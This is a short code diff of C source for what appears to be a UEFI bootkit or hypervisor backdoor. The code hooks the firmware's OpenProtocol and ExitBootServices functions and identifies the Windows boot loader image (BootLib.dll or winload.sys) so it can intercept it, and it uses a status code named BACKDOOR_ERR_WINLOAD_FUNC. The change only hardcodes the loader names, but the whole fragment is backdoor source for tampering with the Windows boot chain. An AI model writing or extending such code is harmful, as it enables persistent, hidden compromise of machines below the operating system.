@@ -360,7 +360,7 @@ EFI_OPEN_PROTOCOL old_OpenProtocol = NULL;
 // return address to ExitBootServices() caller
 UINT64 ret_OpenProtocol = 0;
 
-VOID *FindCallerImage(UINT64 Addr, char *TargetName)
+VOID *FindWinloadImage(UINT64 Addr)
 {
     VOID *Image = NULL;
     UINT64 Size = 0;
@@ -391,8 +391,9 @@ VOID *FindCallerImage(UINT64 Addr, char *TargetName)
         {                    
             EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    
 
-            // check image name
-            if (std_strcmp((char *)RVATOVA(Image, Export->Name), TargetName) == 0)
+            // check winload image name
+            if (std_strcmp((char *)RVATOVA(Image, Export->Name), "BootLib.dll") == 0 ||
+                std_strcmp((char *)RVATOVA(Image, Export->Name), "winload.sys") == 0)
             {
                 return Image;
             }
@@ -415,7 +416,7 @@ EFI_STATUS EFIAPI new_OpenProtocol(
         VOID *WinloadBase = NULL;
 
         // chcek if OpenProtocol() was called from the winload image
-        if ((WinloadBase = FindCallerImage(ret_OpenProtocol, "BootLib.dll")) != NULL)
+        if ((WinloadBase = FindWinloadImage(ret_OpenProtocol)) != NULL)
         {            
             m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_FUNC;
 
@@ -522,7 +523,6 @@ EFI_STATUS EFIAPI new_OpenProtocol(
     // exit to the original function
     return old_OpenProtocol(Handle, Protocol, Interface, AgentHandle, ControllerHandle, Attributes);
 }
-
 //--------------------------------------------------------------------------------------
 // original address of hooked function
 EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;
